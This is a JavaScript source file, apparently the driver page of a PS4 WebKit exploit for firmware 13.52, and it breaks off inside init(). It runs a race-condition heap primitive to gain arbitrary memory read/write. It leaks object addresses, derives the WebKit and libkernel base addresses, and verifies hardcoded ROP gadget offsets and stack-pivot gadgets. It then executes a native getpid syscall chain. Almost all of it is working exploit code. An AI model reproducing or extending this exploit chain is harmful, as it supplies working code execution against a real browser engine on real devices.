import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { groomBootLine, wireGroomBar } from "./groom_presets.js";

const params = new URLSearchParams(location.search);
const BUILD_ID = "rw-20250828a";
/** opt-in only — release triggers JSC GC */
const PROMOTE_PAIR = params.get("promote") === "1";
const RESTORE_LOG = params.get("restorelog") === "1";
const ELF_MAGIC = 0x464c457f;
const SYS_GETPID = 20;
const HW_GADGETS_1352 = {
    wk_POP_RDI_RET: 0x4be55,
    wk_POP_RSI_RET: 0x7acb3,
    wk_POP_RDX_RET: 0x30b1e9,
    wk_POP_RCX_RET: 0xeaf246,
    wk_POP_RAX_RET: 0x3424a,
    wk_POP_R8_RET:  0x5d185,
    wk_POP_R9_RET:  0x9b288b,
    wk_LEAVE_RET:   0xf195b,
    wk_expm1_builtin: 0xeb6350,
};

const lines = [];
const retained = [];
const pointers = [];
let busy = false;
let ready = false;
let exploit = null;
let raceAttempt = 0;
let lengthMissStreak = 0;

const LOG_MAX = 300;
const PERSIST_MAX = 150;
const SS_LOG = "wk-rw-log";
const SS_STATE = "wk-rw-state";
const SS_LOG_BUILD = "wk-rw-log-build";
/** Only persist milestones — not every ATTEMPT line (sessionStorage churn OOMs) */
const PERSIST_TAGS = /^(PRIMITIVE|PAIR|NATIVE|GADGET|PASS|FAIL|WARN|BOOT|ERROR|PROMOTE|TRIM|UA-FW|LOAD|GIVE-UP|HINT-GROOM|LOG-CLEAR|ATTEMPT-START|READ-PRIMITIVE|WEBKIT|LIBKERNEL|GETPID|BASE|ELF|CODE|SAVE)/;
const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|HINT-GROOM/i;

let persistBuf = null;
let raceMode = false;
const raceBuf = [];

let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
let btnStart, btnSaveBases, btnRwProof, btnNative, btnPeek, btnClear;
let gadgetBtns = [];
let nativeChain = null;
let nativeAllowed = false;

function $(id) { return document.getElementById(id); }

function renderOut() {
    if (!outEl) return;
    outEl.textContent = lines.join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}

function persistLine(tag, line) {
    if (!PERSIST_TAGS.test(tag)) return;
    try {
        if (!persistBuf) {
            persistBuf = (sessionStorage.getItem(SS_LOG) || "")
                .split("\n").filter(Boolean);
            while (persistBuf.length > PERSIST_MAX) persistBuf.shift();
        }
        persistBuf.push(line);
        while (persistBuf.length > PERSIST_MAX) persistBuf.shift();
        sessionStorage.setItem(SS_LOG, persistBuf.join("\n"));
        sessionStorage.setItem(SS_LOG_BUILD, BUILD_ID);
    } catch (_) { }
}

function persistState(msg, cls) {
    if (busy && !/OK|FAIL|error|native|primitive|promote|broken/i.test(msg || "")) return;
    try {
        sessionStorage.setItem(SS_STATE, JSON.stringify({
            msg: msg || "",
            cls: cls || "",
            build: BUILD_ID,
            t: Date.now(),
        }));
    } catch (_) { }
}

function clearPersistedLog() {
    persistBuf = null;
    try {
        sessionStorage.removeItem(SS_LOG);
        sessionStorage.removeItem(SS_STATE);
        sessionStorage.removeItem(SS_LOG_BUILD);
    } catch (_) { }
}

function restorePersistedLog() {
    try {
        const prev = sessionStorage.getItem(SS_LOG);
        if (!prev) return false;
        const build = sessionStorage.getItem(SS_LOG_BUILD) || "?";
        const st = sessionStorage.getItem(SS_STATE);
        lines.push("=== RESTORED (prev build=" + build + ") ===");
        for (const l of prev.split("\n")) {
            if (l) lines.push(l);
        }
        lines.push("=== RELOAD build=" + BUILD_ID + " ===");
        if (st) {
            try {
                const j = JSON.parse(st);
                if (j.msg) lines.push("LAST-STATE  " + j.msg);
            } catch (_) { }
        }
        return true;
    } catch (_) {
        return false;
    }
}

function flushPersistMilestones() {
    try {
        persistBuf = [];
        for (let i = 0; i < lines.length; i++) {
            const line = lines[i];
            const tag = line.split(/\s/)[0];
            if (PERSIST_TAGS.test(tag)) persistBuf.push(line);
        }
        while (persistBuf.length > PERSIST_MAX) persistBuf.shift();
        if (persistBuf.length)
            sessionStorage.setItem(SS_LOG, persistBuf.join("\n"));
        sessionStorage.setItem(SS_LOG_BUILD, BUILD_ID);
    } catch (_) { }
}

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    if (raceMode) {
        raceBuf.push(line);
        if (raceBuf.length > 48) raceBuf.shift();
        if (/FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|ATTEMPT-START|PRIMITIVE/i.test(tag)) {
            lines.push(line);
            if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
            if (outEl) {
                outEl.textContent = lines.join("\n");
                outEl.scrollTop = outEl.scrollHeight;
            }
        }
        return;
    }
    lines.push(line);
    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
    persistLine(tag, line);
    renderOut();
}

function state(msg, cls) {
    if (!stateEl) return;
    stateEl.textContent = msg;
    stateEl.className = cls || "";
    if (!raceMode) persistState(msg, cls);
}

function setUi() {
    if (btnStart) btnStart.disabled = busy || ready;
    if (btnSaveBases) btnSaveBases.disabled = busy || !ready;
    if (btnRwProof) btnRwProof.disabled = busy || !ready;
    if (btnNative) btnNative.disabled = busy || !ready || !nativeAllowed;
    if (btnPeek) btnPeek.disabled = busy || !ready;
    if (pickPtr) pickPtr.disabled = busy || !ready;
    if (addrIn) addrIn.disabled = busy || !ready;
    for (let i = 0; i < gadgetBtns.length; i++)
        gadgetBtns[i].disabled = busy || !ready;
}

function parseAddr(str) {
    if (!str) return null;
    const s = String(str).trim().toLowerCase().replace(/^0x/, "");
    if (!/^[0-9a-f]+$/.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16), 0);
    return new int64(parseInt(s.slice(-8), 16), parseInt(s.slice(0, -8), 16));
}

function fmtHex32(v) {
    if (v == null) return "null";
    return "0x" + (v >>> 0).toString(16);
}

function fmtBytes(arr) {
    return arr.map(b => (b & 0xff).toString(16).padStart(2, "0")).join(" ");
}

/** Bases from sessionStorage only — no leakval (OOM-safe). */
function basesFromSession(off) {
    const nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
    let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
    if (!webkitBase && nativeFn && off.wk_expm1_builtin)
        webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    let libkernelBase = parseAddr(sessionStorage.getItem("wk-libkernelBase"));
    return { nativeFn, webkitBase, libkernelBase };
}

function checkPat(p, base, rva, pat) {
    if (rva == null || !base) return { ok: false, detail: "no base/rva" };
    const addr = base.add32(rva);
    const got = [];
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        const b = read1p(p, addr.add32(i));
        if (b == null) return { ok: false, detail: "read-fail @+" + rva.toString(16) };
        got.push(b & 0xff);
        if ((b & 0xff) !== pat[i])
            return {
                ok: false,
                detail: "+0x" + rva.toString(16) + " got=" + fmtBytes(got)
                    + " want=" + fmtBytes(pat.filter(x => x != null)),
            };
    }
    return { ok: true, detail: "+0x" + rva.toString(16) + " " + fmtBytes(got) };
}

function isGetpidStub(v) {
    if (!v) return false;
    if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) return false;
    const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
    return num === SYS_GETPID;
}

/** Manual tests — one button = minimal reads, one log line. */
const MANUAL_TESTS = [
    { id: "elf", group: "base", label: "ELF @ base" },
    { id: "native", group: "base", label: "nativeFn code" },
    { id: "libkernel", group: "base", label: "libkernel" },
    { id: "stub20", group: "base", label: "getpid stub" },
    { id: "pop_rdi", group: "pop", label: "POP RDI", key: "wk_POP_RDI_RET", pat: [0x5f, 0xc3] },
    { id: "pop_rsi", group: "pop", label: "POP RSI", key: "wk_POP_RSI_RET", pat: [0x5e, 0xc3] },
    { id: "pop_rdx", group: "pop", label: "POP RDX", key: "wk_POP_RDX_RET", pat: [0x5a, 0xc3] },
    { id: "pop_rcx", group: "pop", label: "POP RCX", key: "wk_POP_RCX_RET", pat: [0x59, 0xc3] },
    { id: "pop_rax", group: "pop", label: "POP RAX", key: "wk_POP_RAX_RET", pat: [0x58, 0xc3] },
    { id: "pop_r8", group: "pop", label: "POP R8", key: "wk_POP_R8_RET", pat: [null, 0x58, 0xc3] },
    { id: "pop_r9", group: "pop", label: "POP R9", key: "wk_POP_R9_RET", pat: [null, 0x59, 0xc3] },
    { id: "leave", group: "pop", label: "LEAVE", key: "wk_LEAVE_RET", pat: [0xc9, 0xc3] },
    { id: "mov_rdi_rax", group: "pivot", label: "MOV [rdi],rax", key: "wk_MOV_QWORD_PTR_RDI_RAX_RET", pat: [0x48, 0x89, 0x07, 0xc3] },
    { id: "g0", group: "pivot", label: "G0", key: "wk_MOV_RDI_RSI_30_CALL", pat: [0x48, 0x8b, 0x7e, 0x30] },
    { id: "g1", group: "pivot", label: "G1", key: "wk_POP_RAX_MOV_RAX_JMP_18", pat: [0x58, 0x48, 0x8b, 0x07] },
    { id: "g2", group: "pivot", label: "G2", key: "wk_PUSH_RBP_MOV_RBP_RSP_10", pat: [0x55, 0x48, 0x89, 0xe5] },
    { id: "g3", group: "pivot", label: "G3", key: "wk_MOV_RDI_RAX_8_CALL_20", pat: [0x48, 0x8b, 0x78, 0x08] },
    { id: "g4", group: "pivot", label: "G4", key: "wk_MOV_RDX_RAX_18_CALL_10", pat: [0x48, 0x8b, 0x50, 0x38], spKey: true },
    { id: "g5", group: "pivot", label: "G5", key: "wk_PUSH_RDX_POP_RSP_RET", pat: [0x52, 0x5c, 0xc3] },
];

function runManualTest(testId) {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { nativeFn, webkitBase, libkernelBase } = basesFromSession(off);
    const test = MANUAL_TESTS.find(t => t.id === testId);
    if (!test) return;

    if (test.group === "base") {
        if (testId === "elf") {
            if (!webkitBase) {
                mark("GADGET-SKIP", "ELF — no webkitBase (Save bases or cal Accept)");
                return;
            }
            const magic = read4p(p, webkitBase);
            if (magic === ELF_MAGIC)
                mark("GADGET-OK", "ELF magic @ " + webkitBase);
            else if (off.wk_POP_RDI_RET != null) {
                const g = checkPat(p, webkitBase, off.wk_POP_RDI_RET, [0x5f, 0xc3]);
                mark(g.ok ? "GADGET-OK" : "GADGET-BAD",
                    "ELF miss peek=" + fmtHex32(magic) + " but POP_RDI " + g.detail);
            } else {
                mark("GADGET-BAD", "ELF @ " + webkitBase + " peek=" + fmtHex32(magic));
            }
            return;
        }
        if (testId === "native") {
            if (!nativeFn) {
                mark("GADGET-SKIP", "nativeFn — tap Save bases or cal Accept");
                return;
            }
            const q0 = read4p(p, nativeFn);
            if (q0 == null || q0 === 0 || q0 === 0xffffffff || q0 === 0xcccccccc)
                mark("GADGET-BAD", "nativeFn @ " + nativeFn + " code0=" + fmtHex32(q0));
            else
                mark("GADGET-OK", "nativeFn @ " + nativeFn + " code0=" + fmtHex32(q0));
            return;
        }
        if (testId === "libkernel") {
            if (!webkitBase) {
                mark("GADGET-SKIP", "libkernel — no webkitBase");
                return;
            }
            if (!off.wk___imp___error || !off.k__error) {
                mark("GADGET-SKIP", "libkernel — no IAT offsets in table");
                return;
            }
            const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
            if (!errorFn) {
                mark("GADGET-BAD", "IAT __imp___error null");
                return;
            }
            const lk = errorFn.sub32(off.k__error);
            const w0 = read4p(p, lk);
            const w1 = read4p(p, lk.add32(4));
            if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f) {
                try { sessionStorage.setItem("wk-libkernelBase", String(lk)); } catch (_) { }
                mark("GADGET-OK", "libkernel " + lk + " _error prologue");
            } else {
                mark("GADGET-BAD", "libkernel " + lk + " w0=" + fmtHex32(w0) + " w1=" + fmtHex32(w1));
            }
            return;
        }
        if (testId === "stub20") {
            let lk = libkernelBase;
            if (!lk && webkitBase && off.wk___imp___error && off.k__error) {
                const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
                if (errorFn) lk = errorFn.sub32(off.k__error);
            }
            if (!lk) {
                mark("GADGET-SKIP", "getpid stub — run libkernel test first");
                return;
            }
            const o = off.k_stubs && off.k_stubs[SYS_GETPID];
            if (o == null) {
                mark("GADGET-SKIP", "no k_stubs[20] offset");
                return;
            }
            const v = read8p(p, lk.add32(o));
            if (isGetpidStub(v))
                mark("GADGET-OK", "getpid stub @ lk+" + o.toString(16));
            else
                mark("GADGET-BAD", "stub @+" + o.toString(16) + " read8=" + (v ? String(v) : "null"));
            return;
        }
    }

    if (!webkitBase) {
        mark("GADGET-SKIP", test.label + " — no webkitBase (Save bases or cal Accept)");
        return;
    }
    let pat = test.pat;
    if (test.spKey && off.pivot_view_sp != null)
        pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
    const rva = off[test.key];
    const g = checkPat(p, webkitBase, rva, pat);
    mark(g.ok ? "GADGET-OK" : "GADGET-BAD", test.label + " " + g.detail);
}

function saveBasesManual() {
    if (!ready || !window.p || busy) return;
    busy = true;
    setUi();
    try {
        const p = window.p;
        const off = loadEffectiveOff();
        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function || 0x28));
        if (!nativeFn) {
            mark("SAVE-FAIL", "nativeFn capture failed");
            return;
        }
        try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
        const webkitBase = resolveWebkitBase(off, nativeFn);
        if (webkitBase) {
            try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
            mark("SAVE-OK", "nativeFn=" + nativeFn + " webkitBase=" + webkitBase);
        } else {
            mark("SAVE-OK", "nativeFn=" + nativeFn + " (no expm1 for base)");
        }
        state("bases saved — tap gadget buttons", "ok");
    } finally {
        busy = false;
        setUi();
    }
}

function wireGadgetBars() {
    const groups = { base: $("gadget-base"), pop: $("gadget-pop"), pivot: $("gadget-pivot") };
    for (let i = 0; i < MANUAL_TESTS.length; i++) {
        const t = MANUAL_TESTS[i];
        const host = groups[t.group];
        if (!host) continue;
        const b = document.createElement("button");
        b.type = "button";
        b.className = "secondary";
        b.textContent = t.label;
        b.disabled = true;
        const id = t.id;
        wireClick(b, function () { runManualTest(id); });
        host.appendChild(b);
        gadgetBtns.push(b);
    }
}

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function same64(a, b) {
    return a && b && a.low === b.low && a.hi === b.hi;
}

function addPtr(label, addr, note) {
    if (!addr) return;
    const row = { label, addr: String(addr), note: note || "" };
    pointers.push(row);
    mark("ADDR", row.label + "  " + row.addr + (row.note ? "  (" + row.note + ")" : ""));
}

function walkCell(p, label, obj) {
    retained.push(obj);
    const cell = p.leakval(obj);
    addPtr(label + " cell", cell, "leakval");
    const hdr = read8p(p, cell);
    if (hdr) mark("HDR", label + " header=" + hdr);
    for (const [off, tag] of [[0x8, "butterfly"], [0x10, "+0x10"], [0x18, "+0x18"]]) {
        const q = read8p(p, cell.add32(off));
        if (q && q.low !== 0) addPtr(label + " " + tag, q, "cell+0x" + off.toString(16));
    }
    return cell;
}

function captureNativeChain(p, mFunctionOff, off) {
    const cell = walkCell(p, "Math.expm1", Math.expm1);
    const mid = read8p(p, cell.add32(0x18));
    if (!mid) return null;
    addPtr("JSFunction (expm1)", mid, "cell+0x18");
    const nativeFn = read8p(p, mid.add32(mFunctionOff));
    if (nativeFn) {
        addPtr("native code ptr", nativeFn, "m_function / webkit .text");
        try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
        const q0 = read4p(p, nativeFn);
        if (q0 != null) mark("CODE", "nativeFn first4=0x" + (q0 >>> 0).toString(16));
        if (off && off.wk_expm1_builtin) {
            const n = (nativeFn.hi * 0x100000000 + (nativeFn.low >>> 0))
                - (off.wk_expm1_builtin >>> 0);
            const webkitBase = new int64(n >>> 0, Math.floor(n / 0x100000000));
            addPtr("webkitBase (assumed)", webkitBase,
                "nativeFn - 0x" + off.wk_expm1_builtin.toString(16));
            try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
        }
    }
    return nativeFn;
}

function addPairStatusPtrs() {
    const ps = pairStatus;
    const fields = [
        ["mainAddress", "carrier mainView"],
        ["mainVector", "main vector"],
        ["mainCellFromFakeSlot", "main from fake slot"],
        ["workerAddress", "carrier workerView"],
        ["workerVector", "worker vector"],
        ["workerButterfly", "worker butterfly"],
        ["fakeAddress", "fake cell"],
        ["fakeButterfly", "fake butterfly"],
    ];
    for (const [key, label] of fields) {
        const v = ps[key];
        if (v != null && v !== -1) addPtr(label, v, "pair/exploit");
    }
    mark("PAIR", "state=" + ps.state + " promoted=" + ps.promoted
        + " vectorOff=0x" + (ps.vectorOffset >>> 0).toString(16));
}

function renderMap() {
    if (!mapBody) return;
    if (pointers.length === 0) {
        mapBody.innerHTML = "<tr><td colspan=\"3\">no pointers</td></tr>";
        return;
    }
    mapBody.innerHTML = pointers.map((row, i) =>
        "<tr><td>" + row.label + "</td>"
        + "<td class=\"addr\" data-i=\"" + i + "\">" + row.addr + "</td>"
        + "<td>" + row.note + "</td></tr>"
    ).join("");
    mapBody.querySelectorAll(".addr").forEach(el => {
        el.addEventListener("click", () => {
            const row = pointers[+el.getAttribute("data-i")];
            if (row && addrIn) addrIn.value = row.addr.replace(/^0x/i, "");
            peekAt(parseAddr(row.addr.replace(/^0x/i, "")));
        });
    });

    if (pickPtr) {
        const cur = pickPtr.value;
        pickPtr.innerHTML = "<option value=\"\">pick known ptr…</option>"
            + pointers.map((row, i) =>
                "<option value=\"" + i + "\">" + row.label + " " + row.addr + "</option>"
            ).join("");
        if (cur) pickPtr.value = cur;
    }
}

function hexLine(addr, bytes) {
    const a = addr.low.toString(16).padStart(8, "0");
    const h = [...bytes].map(b => b.toString(16).padStart(2, "0")).join(" ");
    return a + "  " + h;
}

function read1p(p, addr) {
    try { return p.read1(addr); } catch (_) { return null; }
}

function peekAt(addr) {
    const p = window.p;
    if (!p || !addr) {
        if (hexEl) hexEl.textContent = "bad address";
        return;
    }
    const out = [];
    let cur = addr;
    for (let row = 0; row < 8; row++) {
        const chunk = [];
        for (let i = 0; i < 8; i++) {
            const b = read1p(p, cur.add32(i));
            if (b == null) {
                if (hexEl) hexEl.textContent = out.join("\n") + "\n(read failed @ " + cur + ")";
                return;
            }
            chunk.push(b & 0xff);
        }
        out.push(hexLine(cur, chunk));
        cur = cur.add32(8);
    }
    if (hexEl) hexEl.textContent = out.join("\n");
    mark("PEEK", String(addr));
}

function loadEffectiveOff() {
    const detected = offsetsFor(navigator.userAgent);
    const key = detected.key || "13.52";
    let off = Object.assign({}, offsetsForKey(key).off || {});
    try {
        const cal = sessionStorage.getItem("wk-calibrated");
        if (cal) off = Object.assign(off, JSON.parse(cal));
    } catch (_) { }
    return Object.assign(off, HW_GADGETS_1352);
}

function captureNativeFnQuick(p, off) {
    try {
        const raw = sessionStorage.getItem("wk-nativeFn");
        if (raw) {
            const fn = parseAddr(String(raw).replace(/^0x/i, ""));
            if (fn) return fn;
        }
    } catch (_) { }
    const cell = p.leakval(Math.expm1);
    return p.read8(p.read8(cell.add32(0x18))
        .add32(off.wk_JSFunction_m_function || 0x28));
}

function resolveLibkernelBase(p, off, webkitBase) {
    try {
        const raw = sessionStorage.getItem("wk-libkernelBase");
        if (raw) {
            const b = parseAddr(String(raw).replace(/^0x/i, ""));
            if (b) return b;
        }
    } catch (_) { }
    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    return errorFn.sub32(off.k__error);
}

function stripUiForNative() {
    for (const id of ["groom-bar", "peek-bar", "hint", "map",
        "gadget-base", "gadget-pop", "gadget-pivot"]) {
        const el = document.getElementById(id);
        if (el) el.style.display = "none";
    }
    const mapTable = document.getElementById("map");
    if (mapTable && mapTable.previousElementSibling)
        mapTable.previousElementSibling.style.display = "none";
    const hexTitle = document.getElementById("hex");
    if (hexTitle && hexTitle.previousElementSibling)
        hexTitle.previousElementSibling.style.display = "none";
}

function resolveWebkitBase(off, nativeFn) {
    try {
        const raw = sessionStorage.getItem("wk-webkitBase");
        if (raw) {
            const b = parseAddr(String(raw).replace(/^0x/i, ""));
            if (b) return b;
        }
    } catch (_) { }
    if (nativeFn && off.wk_expm1_builtin)
        return nativeFn.sub32(off.wk_expm1_builtin);
    return null;
}

async function doNativeCallImmediate() {
    if (!nativeAllowed) {
        mark("NATIVE-FAIL", "window.p broken — reload");
        state("native blocked", "bad");
        return;
    }
    const p = window.p;
    if (!p) throw new Error("window.p missing");

    const off = loadEffectiveOff();
    const nativeFn = captureNativeFnQuick(p, off);
    const webkitBase = resolveWebkitBase(off, nativeFn);
    if (!webkitBase) {
        mark("NATIVE-FAIL", "no webkitBase — run index_cal Accept first");
        state("need cal base", "bad");
        return;
    }
    const libkernelBase = resolveLibkernelBase(p, off, webkitBase);
    if (nativeChain) {
        nativeChain.disarm();
        nativeChain = null;
    }
    mark("NATIVE-SETUP", "base=" + webkitBase + " lk=" + libkernelBase
        + " promoted=" + pairStatus.promoted);
    const { initNativeCall } = await import("./native_call.js");
    const chain = initNativeCall(p, off, {
        webkitBase,
        nativeFn,
        log: () => {},
        trust: true,
        noStubScan: true,
        getpidOnly: true,
    });
    nativeChain = chain;
    try {
        sessionStorage.setItem("wk-libkernelBase", String(libkernelBase));
    } catch (_) { }
    mark("NATIVE-CALL", "getpid… build=" + BUILD_ID);
    const pid = chain.sc(20).i32;
    if (pid > 0) {
        mark("NATIVE-OK", "getpid=" + pid);
        state("native call OK pid=" + pid, "ok");
    } else {
        mark("NATIVE-FAIL", "getpid=" + pid);
        state("getpid returned <=0", "bad");
    }
}

async function freeBeforeNative() {
    stripUiForNative();
    retained.length = 0;
    pointers.length = 0;
    mark("NATIVE-PREP", "ui trimmed — groom stays pinned");
    exploit = null;
}

function seedNativeSession(p, off) {
    const fn = captureNativeFnQuick(p, off);
    if (fn) {
        try { sessionStorage.setItem("wk-nativeFn", String(fn)); } catch (_) { }
        const base = resolveWebkitBase(off, fn);
        if (base) try { sessionStorage.setItem("wk-webkitBase", String(base)); } catch (_) { }
    }
    return fn;
}

async function runRwProofManual() {
    if (busy || !ready || !window.p) return;
    busy = true;
    setUi();
    try {
        pointers.length = 0;
        renderMap();
        const ok = await runRwProof(window.p, loadEffectiveOff());
        mark(ok ? "PASS" : "WARN", "RW proof map done — " + pointers.length + " ptrs");
        state(ok ? "RW proof OK" : "RW proof partial", ok ? "ok" : "warn");
    } finally {
        busy = false;
        setUi();
    }
}

async function runNativeCall() {
    if (busy || !ready || !window.p) return;
    busy = true;
    setUi();
    try {
        await freeBeforeNative();
        await doNativeCallImmediate();
    } catch (err) {
        if (nativeChain) {
            try { nativeChain.disarm(); } catch (_) { }
            nativeChain = null;
        }
        mark("NATIVE-FAIL", err.message || String(err));
        state("native call failed", "bad");
    } finally {
        busy = false;
        setUi();
    }
}

async function loadExploit() {
    if (exploit) return exploit;
    mark("LOAD", "core.js + mem.js");
    const core = await import("./core.js");
    exploit = {
        establishPrimitive: core.establishPrimitive,
        installWindowP,
    };
    return exploit;
}

function attemptCap() {
    if (!params.has("attempts")) return 0;
    const n = parseInt(params.get("attempts"), 10);
    return n > 0 ? n : 0;
}

function onRaceEvent(tag, detail) {
    if (!CORE_LOG.test(tag)) return;
    mark(tag, detail || "");

    if (tag === "ATTEMPT-START") {
        raceAttempt++;
        state("race attempt " + raceAttempt + "…", "warn");
        if (raceAttempt === 15 || raceAttempt === 30 || raceAttempt === 50)
            mark("HINT-GROOM", "still missing? close browser fully → reload → tap 512 or max groom");
    }

    if (/COMPOSITION-LENGTH-MISS|SSV-PLACEMENT-MISS|ZERO-HEADER-MISS/.test(tag)) {
        lengthMissStreak++;
        if (lengthMissStreak === 8 || lengthMissStreak === 20)
            mark("HINT-GROOM", "COMPOSITION-LENGTH-MISS = race lost — tap 512 drain or max groom, close browser, reload");
    }

    if (tag === "READ-PRIMITIVE-PASS" || tag === "PRIMITIVE-OK")
        lengthMissStreak = 0;
}

async function establishOnce(establishPrimitive) {
    raceAttempt = 0;
    lengthMissStreak = 0;
    raceBuf.length = 0;
    raceMode = true;
    const cap = attemptCap();
    try {
        return await establishPrimitive({
            maxAttempts: cap,
            skipTrimDebris: true,
            onEvent: (t, d, a) => onRaceEvent(t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
    } finally {
        raceMode = false;
        for (let i = 0; i < raceBuf.length; i++) {
            const line = raceBuf[i];
            const tag = line.split(/\s/)[0];
            if (/FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|PRIMITIVE|PAIR|HINT/i.test(tag)) {
                let dup = false;
                for (let j = 0; j < lines.length; j++) {
                    if (lines[j] === line) { dup = true; break; }
                }
                if (!dup) lines.push(line);
            }
        }
        raceBuf.length = 0;
        if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
        flushPersistMilestones();
        renderOut();
    }
}

function bufAddr(p, off, ab) {
    const cell = walkCell(p, "ArrayBuffer", ab);
    const impl = read8p(p, cell.add32(off.wk_ArrayBuffer_m_impl));
    if (!impl) return null;
    addPtr("ArrayBuffer impl", impl, "+0x" + off.wk_ArrayBuffer_m_impl.toString(16));
    const data = read8p(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
    if (data) addPtr("ArrayBuffer backing", data, "m_contents.m_data");
    return data;
}

async function runRwProof(p, off) {
    const boxA = { tag: "demoA", n: 1 };
    const boxB = { tag: "demoB", n: 2 };
    walkCell(p, "JSObject A", boxA);
    walkCell(p, "JSObject B", boxB);

    const rowA = pointers.filter(x => x.label === "JSObject A cell").pop();
    const rowB = pointers.filter(x => x.label === "JSObject B cell").pop();
    const addrA = rowA ? parseAddr(String(rowA.addr).replace(/^0x/i, "")) : null;
    const addrB = rowB ? parseAddr(String(rowB.addr).replace(/^0x/i, "")) : null;

    const okLeak = addrA && addrB && !same64(addrA, addrB) && addrA.low !== 0;
    mark(okLeak ? "PASS" : "FAIL", "leakval-distinct  a=" + addrA + " b=" + addrB);

    const headerA = okLeak ? p.read8(addrA) : null;
    if (headerA) {
        p.write8(addrA, headerA);
    }
    const okHdr = headerA && same64(p.read8(addrA), headerA);
    mark(okHdr ? "PASS" : "FAIL", "read8-write8 header roundtrip");

    const probe = new ArrayBuffer(0x20);
    retained.push(probe);
    const view = new Uint32Array(probe);
    view[0] = 0xcafebabe;

    if (off) {
        const dataPtr = bufAddr(p, off, probe);
        if (!dataPtr) {
            mark("FAIL", "arraybuffer backing chain");
        } else {
            const got = read4p(p, dataPtr);
            const okR = got === 0xcafebabe;
            mark(okR ? "PASS" : "FAIL", "arraybuffer-read4  got=0x"
                + (got == null ? "null" : got.toString(16)));
            if (okR) {
                p.write4(dataPtr, new int64(0x600dbabe, 0));
                mark(view[0] === 0x600dbabe ? "PASS" : "FAIL", "arraybuffer-write4");
            }
        }
        captureNativeChain(p, off.wk_JSFunction_m_function || 0x28, off);
    }

    try { walkCell(p, "parseFloat", parseFloat); } catch (_) { }
    try { walkCell(p, "Object proto", Object); } catch (_) { }

    addPairStatusPtrs();
    renderMap();
    mark("ADDR-LIST", pointers.length + " pointers logged above");

    return okLeak && okHdr;
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    setUi();
    lines.length = 0;
    raceBuf.length = 0;
    if (RESTORE_LOG) restorePersistedLog();
    else clearPersistedLog();
    if (outEl) outEl.textContent = "";
    pointers.length = 0;
    renderMap();

    const detected = offsetsFor(navigator.userAgent);
    mark("UA-FW", detected.key || "unknown");
    state("getting primitive…", "warn");

    try {
        const { establishPrimitive, installWindowP: installP } = await loadExploit();
        let carrier;
        try {
            carrier = await establishOnce(establishPrimitive);
        } catch (err) {
            if (/gave up/i.test(String(err.message))) {
                mark("HINT-GROOM", "race lost — close browser fully, reload, tap 512 or max groom, Start again");
            }
            throw err;
        }

        installP(carrier, {
            promote: PROMOTE_PAIR,
            onEvent: (t, d) => {
                if (/PAIR|TRIM|RELEASE|FAIL|ERROR/i.test(t))
                    mark(t, d || "");
            },
        });
        const p = window.p;
        if (!p) throw new Error("window.p missing");

        nativeAllowed = pairStatus.state !== "broken";
        mark("PRIMITIVE-OK", "arb rw live");
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted);
        ready = true;
        state("primitive OK — tap Save bases, then test gadgets", "ok");
    } catch (err) {
        state("failed: " + err.message, "bad");
        mark("ERROR", err.stack || err.message);
    } finally {
        busy = false;
        setUi();
    }
}

function refreshMap() {
    runRwProofManual();
}

function reportErr(err) {
    const msg = err && err.message ? err.message : String(err);
    state("error: " + msg, "bad");
    mark("ERROR", err && err.stack ? err.stack : msg);
}

function wireClick(el, fn) {
    if (!el) return;
    el.addEventListener("click", function () {
        try {
            const r = fn();
            if (r && typeof r.then === "function")
                r.catch(reportErr);
        } catch (err) {
            reportErr(err);
        }
    });
}

function init() {
    outEl = $("out");
    stateEl = $("state");
    mapBody = $("map-body");
    hexEl = $("hex");
    pickPtr = $("pick-ptr");
    addrIn = $("addr-in");
    btnStart = $("btn-start");
    btnSaveBases = $("btn-save-bases");
    btnRwProof = $("btn-rw-proof");
